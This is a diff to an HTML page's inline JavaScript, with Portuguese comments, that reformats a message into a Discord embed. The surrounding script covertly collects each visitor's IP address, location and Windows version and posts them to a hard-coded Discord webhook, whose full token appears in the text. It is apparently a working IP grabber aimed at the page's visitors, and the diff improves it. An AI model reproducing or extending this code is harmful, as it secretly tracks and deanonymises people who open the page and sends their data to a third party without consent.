@@ -25,7 +25,7 @@
         </div>
     </main>
     <script>
-        // Função para enviar mensagem por webhook
+        // Função para enviar mensagem por webhook como um embed
         function enviarMensagem() {
             // Obter o IP do usuário
             fetch('https://api64.ipify.org?format=json')
@@ -42,8 +42,27 @@
                             // Obter a edição do Windows
                             const windowsEdition = window.navigator.userAgent.match(/Windows NT (\d+\.\d+)/)[1];
 
-                            // Construir a mensagem
-                            const mensagem = `IP do usuário: ${ip}\nLocalização: ${localizacao}\nEdição do Windows: Windows ${windowsEdition}`;
+                            // Construir a mensagem como um embed
+                            const mensagem = {
+                                embeds: [{
+                                    title: 'Informações do Usuário',
+                                    color: 0x007bff,
+                                    fields: [
+                                        {
+                                            name: 'IP do usuário',
+                                            value: ip
+                                        },
+                                        {
+                                            name: 'Localização',
+                                            value: localizacao
+                                        },
+                                        {
+                                            name: 'Edição do Windows',
+                                            value: `Windows ${windowsEdition}`
+                                        }
+                                    ]
+                                }]
+                            };
 
                             // Enviar a mensagem por webhook
                             const webhookURL = 'https://discord.com/api/webhooks/1232090820392386664/GVsiEsNNbw7895pmtTJOgHAdTSrZ8DsSBstDfBk5KSSonnjlSjBQ4kNzS7aKbog93svM';
@@ -52,9 +71,7 @@
                                 headers: {
                                     'Content-Type': 'application/json'
                                 },
-                                body: JSON.stringify({
-                                    content: mensagem
-                                })
+                                body: JSON.stringify(mensagem)
                             }).then(() => {
                                 console.log('Mensagem enviada com sucesso!');
                             }).catch(error => {
